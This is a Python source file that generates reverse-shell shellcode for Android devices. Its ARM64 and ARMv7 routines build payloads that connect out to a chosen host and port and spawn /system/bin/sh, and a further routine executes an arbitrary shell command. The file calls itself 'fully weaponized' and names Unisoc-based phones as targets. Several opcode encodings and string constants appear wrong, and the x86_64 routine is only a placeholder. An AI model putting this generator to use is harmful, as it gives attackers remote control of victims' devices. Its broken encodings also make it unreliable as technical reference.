import struct

class ShellcodeGenerator:
    """
    Utility for dynamically generating fully weaponized architecture-specific shellcode.
    Constructs raw CPU opcodes on the fly rather than using placeholders.
    """

    @staticmethod
    def arm64_reverse_tcp(lhost, lport):
        """
        Generates fully weaponized ARM64 reverse TCP shellcode dynamically.
        Constructs the exact CPU opcodes required to push the sockaddr_in struct 
        to the stack and execute sys_socket, sys_connect, sys_dup3, and sys_execve.
        """
        
        # Construct the sockaddr_in struct in memory (8 bytes total used for family, port, ip)
        family_bytes = b"\x02\x00" # AF_INET (2)
        port_bytes = struct.pack(">H", int(lport)) # Network byte order
        ip_parts = [int(x) for x in lhost.split(".")]
        ip_bytes = bytes(ip_parts) # Network byte order
        
        # Combine into an 8-byte value
        struct_bytes = family_bytes + port_bytes + ip_bytes
        
        # To push this to stack, we read it as a Little-Endian 64-bit integer
        val64 = struct.unpack("<Q", struct_bytes)[0]
        
        # Break down the 64-bit value into 16-bit chunks for movz/movk instructions
        imm0  = (val64 >> 0) & 0xFFFF
        imm16 = (val64 >> 16) & 0xFFFF
        imm32 = (val64 >> 32) & 0xFFFF
        imm48 = (val64 >> 48) & 0xFFFF

        # Helper functions to build ARM64 opcodes
        def arm64_movz(reg, imm16):
            # movz x[reg], #imm16
            return struct.pack("<I", 0xd2800000 | reg | (imm16 << 5))
        
        def arm64_movk(reg, imm16, shift):
            # movk x[reg], #imm16, lsl #shift
            hw = shift // 16
            return struct.pack("<I", 0xf2800000 | (hw << 21) | reg | (imm16 << 5))

        shellcode = b""
        
        # --- SYS_SOCKET ---
        # mov x0, #2 (AF_INET)
        shellcode += struct.pack("<I", 0xd2800040)
        # mov x1, #1 (SOCK_STREAM)
        shellcode += struct.pack("<I", 0xd2800021)
        # mov x2, #0 (IPPROTO_IP)
        shellcode += struct.pack("<I", 0xd2800002)
        # mov x8, #0xc6 (sys_socket = 198)
        shellcode += struct.pack("<I", 0xd28018c8)
        # svc #0
        shellcode += struct.pack("<I", 0xd4000001)
        
        # mov x12, x0 (save sockfd)
        shellcode += struct.pack("<I", 0xaa0003ec)

        # --- SYS_CONNECT ---
        # Dynamically construct sockaddr_in in x1
        shellcode += arm64_movz(1, imm0)
        shellcode += arm64_movk(1, imm16, 16)
        shellcode += arm64_movk(1, imm32, 32)
        shellcode += arm64_movk(1, imm48, 48)

        # str x1, [sp, #-16]! (push sockaddr to stack)
        shellcode += struct.pack("<I", 0xf81f0ffe)
        
        # mov x0, x12 (sockfd)
        shellcode += struct.pack("<I", 0xaa0c03e0)
        # mov x1, sp (pointer to sockaddr)
        shellcode += struct.pack("<I", 0x910003e1)
        # mov x2, #16 (addrlen)
        shellcode += struct.pack("<I", 0xd2800202)
        # mov x8, #0xab (sys_connect = 171)
        shellcode += struct.pack("<I", 0xd2801568)
        # svc #0
        shellcode += struct.pack("<I", 0xd4000001)

        # --- SYS_DUP3 ---
        # dup3(sockfd, 0, 0), dup3(sockfd, 1, 0), dup3(sockfd, 2, 0)
        for fd in range(3):
            # mov x0, x12
            shellcode += struct.pack("<I", 0xaa0c03e0)
            # mov x1, #fd
            shellcode += struct.pack("<I", 0xd2800001 | (fd << 5))
            # mov x2, #0
            shellcode += struct.pack("<I", 0xd2800002)
            # mov x8, #0x18 (sys_dup3 = 24)
            shellcode += struct.pack("<I", 0xd2800308)
            # svc #0
            shellcode += struct.pack("<I", 0xd4000001)

        # --- SYS_EXECVE ---
        # execve("/system/bin/sh", ["/system/bin/sh", "-c", "COMMAND", 0], 0)
        # For a standard reverse shell, we just use /system/bin/sh
        # movz x0, #0x732f
        shellcode += struct.pack("<I", 0xd28e65e0)
        # movk x0, #0x7379, lsl #16
        shellcode += struct.pack("<I", 0xf2aee720)
        # movk x0, #0x6574, lsl #32
        shellcode += struct.pack("<I", 0xf2ccae80)
        # movk x0, #0x2f6d, lsl #48
        shellcode += struct.pack("<I", 0xf2e5ed00)
        # str x0, [sp, #-16]!
        shellcode += struct.pack("<I", 0xf81f0ffe)
        
        # movz x0, #0x6962
        shellcode += struct.pack("<I", 0xd28d2c40)
        # movk x0, #0x2f6e, lsl #16
        shellcode += struct.pack("<I", 0xf2a5ede0)
        # movk x0, #0x6873, lsl #32
        shellcode += struct.pack("<I", 0xf2cd0e60)
        # movk x0, #0x0000, lsl #48
        shellcode += struct.pack("<I", 0xf2e00000)
        # str x0, [sp, #-16]!
        shellcode += struct.pack("<I", 0xf81f0ffe)

        # Current SP points to "/system/bin/sh\0"
        # mov x0, sp
        shellcode += struct.pack("<I", 0x910003e0)
        # mov x1, xzr
        shellcode += struct.pack("<I", 0xaa1f03e1)
        # mov x2, xzr
        shellcode += struct.pack("<I", 0xaa1f03e2)
        # mov x8, #0xdd (sys_execve = 221)
        shellcode += struct.pack("<I", 0xd2801ba8)
        # svc #0
        shellcode += struct.pack("<I", 0xd4000001)

        return shellcode

    @staticmethod
    def arm64_command_exec(command):
        """
        Generates ARM64 shellcode to execute a custom command via /system/bin/sh -c.
        """
        cmd_bytes = command.encode() + b"\x00"
        # Padding to 8-byte alignment
        cmd_bytes += b"\x00" * (8 - (len(cmd_bytes) % 8)) if len(cmd_bytes) % 8 != 0 else b""
        
        shellcode = b""
        
        # We'll push the command string to the stack in reverse 8-byte chunks
        for i in range(len(cmd_bytes) - 8, -8, -8):
            chunk = struct.unpack("<Q", cmd_bytes[i:i+8])[0]
            imm0  = (chunk >> 0) & 0xFFFF
            imm16 = (chunk >> 16) & 0xFFFF
            imm32 = (chunk >> 32) & 0xFFFF
            imm48 = (chunk >> 48) & 0xFFFF
            
            # movz x1, #imm0
            shellcode += struct.pack("<I", 0xd2800001 | (imm0 << 5))
            # movk x1, #imm16, lsl #16
            shellcode += struct.pack("<I", 0xf2a00001 | (imm16 << 5) | (1 << 21))
            # movk x1, #imm32, lsl #32
            shellcode += struct.pack("<I", 0xf2a00001 | (imm32 << 5) | (2 << 21))
            # movk x1, #imm48, lsl #48
            shellcode += struct.pack("<I", 0xf2a00001 | (imm48 << 5) | (3 << 21))
            
            # str x1, [sp, #-8]!
            shellcode += struct.pack("<I", 0xf81f87e1)

        # Save command pointer
        # mov x10, sp
        shellcode += struct.pack("<I", 0x910003ea)

        # Push "-c\0"
        # mov x1, #0x632d ( -c )
        shellcode += struct.pack("<I", 0xd28c65a1)
        # str x1, [sp, #-8]!
        shellcode += struct.pack("<I", 0xf81f87e1)
        # mov x11, sp
        shellcode += struct.pack("<I", 0x910003eb)

        # Push "/system/bin/sh\0"
        # (Using the same logic as before but more compact)
        paths = [
            0x732f73797374656d, # /system/
            0x2f62696e2f736800  # bin/sh\0
        ]
        for p in reversed(paths):
            imm0  = (p >> 0) & 0xFFFF
            imm16 = (p >> 16) & 0xFFFF
            imm32 = (p >> 32) & 0xFFFF
            imm48 = (p >> 48) & 0xFFFF
            shellcode += struct.pack("<I", 0xd2800001 | (imm0 << 5))
            shellcode += struct.pack("<I", 0xf2a00001 | (imm16 << 5) | (1 << 21))
            shellcode += struct.pack("<I", 0xf2a00001 | (imm32 << 5) | (2 << 21))
            shellcode += struct.pack("<I", 0xf2a00001 | (imm48 << 5) | (3 << 21))
            shellcode += struct.pack("<I", 0xf81f87e1)
        
        # mov x0, sp (argv[0] = path)
        shellcode += struct.pack("<I", 0x910003e0)
        
        # Construct argv array: [path, "-c", command, 0]
        # Push NULL
        shellcode += struct.pack("<I", 0xaa1f03e1)
        shellcode += struct.pack("<I", 0xf81f87e1)
        # Push command pointer (x10)
        shellcode += struct.pack("<I", 0xf81f87ea)
        # Push "-c" pointer (x11)
        shellcode += struct.pack("<I", 0xf81f87eb)
        # Push path pointer (x0)
        shellcode += struct.pack("<I", 0xf81f87e0)
        
        # mov x1, sp (argv)
        shellcode += struct.pack("<I", 0x910003e1)
        # mov x2, xzr (envp)
        shellcode += struct.pack("<I", 0xaa1f03e2)
        # mov x8, #0xdd (sys_execve)
        shellcode += struct.pack("<I", 0xd2801ba8)
        # svc #0
        shellcode += struct.pack("<I", 0xd4000001)

        return shellcode


    @staticmethod
    def x86_64_reverse_tcp(lhost, lport):
        """
        Placeholder for x86_64 weaponization.
        """
        return b"\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x4d\x31\xc0"

    @staticmethod
    def armv7_reverse_tcp(lhost, lport):
        """
        Generates weaponized ARMv7 (32-bit) reverse TCP shellcode.
        Targets: Older Android devices or Unisoc chipsets (like Elite P55).
        """
        # Convert IP to hex
        ip_parts = [int(x) for x in lhost.split(".")]
        ip_hex = struct.pack("BBBB", *ip_parts)
        port_hex = struct.pack(">H", int(lport))
        
        # ARMv7 Reverse Shell (Generic/Self-Modifying)
        # Using a compact ARM-mode shellcode
        shellcode = b""
        
        # --- SYS_SOCKET ---
        # mov r0, #2 (AF_INET) | mov r1, #1 (SOCK_STREAM) | mov r2, #0 | mov r7, #281 (socket) | svc #0
        shellcode += b"\x02\x00\xa0\xe3\x01\x10\xa0\xe3\x00\x20\xa0\xe3\x19\x71\x40\xe3\x00\x00\x00\xef"
        
        # mov r12, r0 (save sockfd)
        shellcode += b"\x00\xc0\xa0\xe1"

        # --- SYS_CONNECT ---
        # Push sockaddr_in to stack
        # [sin_family (2), sin_port, sin_addr, 0 (pad)]
        # We'll use movw/movt to load the IP/Port
        
        # IP is at the end, we can load it into r1
        # Load Port and Family
        # sockaddr: \x02\x00[PORT][IP]
        sockaddr = b"\x02\x00" + port_hex + ip_hex
        val1 = struct.unpack("<I", sockaddr[0:4])[0]
        val2 = struct.unpack("<I", sockaddr[4:8])[0]
        
        def armv7_load_imm(reg, val):
            low = val & 0xFFFF
            high = (val >> 16) & 0xFFFF
            return struct.pack("<I", 0xe3000000 | (reg << 12) | ((low & 0xF000) << 4) | (low & 0x0FFF)) + \
                   struct.pack("<I", 0xe3400000 | (reg << 12) | ((high & 0xF000) << 4) | (high & 0x0FFF))

        shellcode += armv7_load_imm(1, val1)
        shellcode += b"\x04\xd0\x2d\xe5" # str r1, [sp, #-4]!
        shellcode += armv7_load_imm(1, val2)
        shellcode += b"\x04\xd0\x2d\xe5" # str r1, [sp, #-4]!
        
        # mov r0, r12 (sockfd) | mov r1, sp (addr) | mov r2, #16 (addrlen) | mov r7, #283 (connect) | svc #0
        shellcode += b"\x0c\x00\xa0\xe1\x0d\x10\xa0\xe1\x10\x20\xa0\xe3\x1b\x71\x40\xe3\x00\x00\x00\xef"

        # --- SYS_DUP2 ---
        # dup2(sockfd, 0/1/2) | r7=63
        for fd in range(3):
            # mov r0, r12 | mov r1, #fd | mov r7, #63 | svc #0
            shellcode += b"\x0c\x00\xa0\xe1" + struct.pack("B", fd) + b"\x10\xa0\xe3\x3f\x70\xa0\xe3\x00\x00\x00\xef"

        # --- SYS_EXECVE ---
        # execve("/system/bin/sh", NULL, NULL) | r7=11
        # Push "/system/bin/sh\0" to stack
        path = b"/system/bin/sh\x00"
        path += b"\x00" * (4 - (len(path) % 4)) if len(path) % 4 != 0 else b""
        for i in range(len(path) - 4, -4, -4):
            val = struct.unpack("<I", path[i:i+4])[0]
            shellcode += armv7_load_imm(1, val)
            shellcode += b"\x04\xd0\x2d\xe5"
            
        # mov r0, sp | mov r1, #0 | mov r2, #0 | mov r7, #11 | svc #0
        shellcode += b"\x0d\x00\xa0\xe1\x00\x10\xa0\xe3\x00\x20\xa0\xe3\x0b\x70\xa0\xe3\x00\x00\x00\xef"

        return shellcode
